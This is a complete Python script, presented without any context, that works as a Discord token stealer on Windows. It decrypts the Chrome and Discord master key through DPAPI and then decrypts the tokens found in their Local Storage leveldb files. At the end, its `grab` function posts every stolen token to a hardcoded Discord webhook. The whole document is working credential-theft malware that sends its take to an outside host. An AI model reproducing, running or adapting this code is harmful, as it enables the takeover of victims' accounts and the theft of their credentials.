import os, re, json, base64, requests
from Cryptodome.Cipher import AES
import ctypes
from ctypes import wintypes

# Simplified Webhook
WEBHOOK_URL = 'https://discord.com/api/webhooks/1492251907832676473/aqwYuwPQWrXACpXM5GCOG7k7XEjC64ZVts9aCLtiM8veasSGO2Ci6uAnxRrxiMogcy84'

# Native Windows DPAPI call to avoid win32crypt dependency
def dpapi_decrypt(encrypted_bytes):
    class DATA_BLOB(ctypes.Structure):
        _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]

    p_data_in = DATA_BLOB(len(encrypted_bytes), ctypes.create_string_buffer(encrypted_bytes))
    p_data_out = DATA_BLOB()
    
    if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(p_data_in), None, None, None, None, 0, ctypes.byref(p_data_out)):
        result = ctypes.string_at(p_data_out.pbData, p_data_out.cbData)
        ctypes.windll.kernel32.LocalFree(p_data_out.pbData)
        return result
    return None

def get_key(path):
    if not os.path.exists(path): return None
    with open(path, "r", encoding="utf-8") as f:
        state = json.load(f)
    key = base64.b64decode(state["os_crypt"]["encrypted_key"])[5:]
    return dpapi_decrypt(key)

def decrypt_val(buff, master_key):
    try:
        iv, payload = buff[3:15], buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except: return None

def grab():
    paths = {
        'Discord': os.getenv('APPDATA') + '\\discord\\Local Storage\\leveldb',
        'Chrome': os.getenv('LOCALAPPDATA') + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb'
    }
    tokens = []

    for name, db_path in paths.items():
        # Look for Local State in the parent directories
        state_path = db_path.split('Local Storage')[0] + 'Local State'
        m_key = get_key(state_path)
        if not m_key or not os.path.exists(db_path): continue

        for file in os.listdir(db_path):
            if file.endswith(('.log', '.ldb')):
                with open(os.path.join(db_path, file), 'r', errors='ignore') as f:
                    for line in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*?)'\].*$][^\"]*", f.read()):
                        token = decrypt_val(base64.b64decode(line.split('dQw4w9WgXcQ:')[1]), m_key)
                        if token and token not in tokens: tokens.append(token)

    if tokens:
        requests.post(WEBHOOK_URL, json={"content": f"Found: {len(tokens)}\n" + "\n".join(tokens)})

if __name__ == "__main__":
    grab()
